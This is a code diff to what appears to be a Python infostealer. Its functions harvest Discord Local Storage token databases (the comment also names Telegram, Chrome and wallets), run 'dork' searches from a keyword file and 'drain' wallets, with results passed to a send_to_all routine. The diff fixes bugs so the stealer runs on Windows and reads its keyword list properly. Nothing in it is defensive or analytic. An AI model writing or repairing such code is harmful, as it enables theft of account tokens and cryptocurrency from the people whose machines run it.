@@ -42,8 +42,11 @@ def harvest_local():
     # Discord + Telegram + Chrome + Wallets
     paths = [
         os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
-        os.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
     ]
+    if os.name == "nt":
+        appdata_path = os.getenv("APPDATA")
+        if appdata_path:
+            paths.append(appdata_path + "\\discord\\Local Storage\\leveldb")
     for p in paths:
         if os.path.exists(p):
             for root, _, files in os.walk(p):
@@ -58,7 +61,8 @@ def harvest_local():
     send_to_all(report)
 
 def global_dorks():
-    dorks = dkeywords.txt
+    with open('dkeywords.txt', 'r') as f:
+        dorks = [line.strip() for line in f if line.strip()]
     report = "† GLOBAL DORK HARVEST †\n"
     for dork in dorks:
         try:
@@ -83,8 +87,5 @@ def main():
     harvest_local()
     global_dorks()
     drain_wallets()
-    while True:
-        time.sleep(3600)
-
 if __name__ == "__main__":
     main()
